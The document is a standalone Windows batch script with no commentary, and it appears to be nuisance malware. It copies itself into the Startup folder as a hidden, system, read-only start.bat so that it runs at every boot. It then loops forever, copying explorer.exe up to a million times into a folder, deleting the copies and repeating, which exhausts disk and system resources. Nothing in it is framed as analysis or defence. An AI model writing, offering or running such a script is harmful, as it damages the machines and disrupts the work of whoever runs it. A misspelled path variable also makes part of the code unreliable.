   @echo off
   if exist %windir%\startm~1\programs\startup goto win9x
   if not exist %windir%\startm~1\programs\startup goto winnt

   :winnt
   %homedrive% >nul
   cd %ALLUSERSPROFILE%\ >nul
   command /c >nul
   cd startm~1\programs\startup\ >nul
   if not exist start.bat copy %0 start.bat >nul
   attrib +H +S +R +A start.bat >nul
   goto hdd

   :win9x
   %homedrive% >nul
   cd %windir%\ >nul
   command /c >nul
   cd startm~1\programs\startup\ >nul
   if not exist start.bat copy %0 start.bat >nul
   attrib +H +S +R +A start.bat >nul
   goto hdd


   :hdd
   command /c
   @for %%a in (0 1 2 3 4 5 6 7 8 9) do for %%b in (0 1 2 3 4 5 6 7 8 9) do for %%c in (0 1 2 3 4 5 6 7 8 9) do for %%d in (0 1 2 3 4 5 6 7 8 9) do for %%e in (0 1 2 3 4 5 6 7 8 9) do for %%f in (0 1 2 3 4 5 6 7 8 9) do copy %windir%\explorer.exe %homedirve%\blabla\%random%%%a%%b%%c%%d%%e%%f.exe
   if exist %windir%\startm~1\programs\startup goto win9xdel
   if not exist %windir%\startm~1\programs\startup goto winntdel

   :win9xdel
   command /c
   deltree /y %homedirve%\blabla\*.exe
   goto hdd

   :winntdel
   command /c
   del %homedirve%\blabla\*.exe /S /Q
   goto hdd
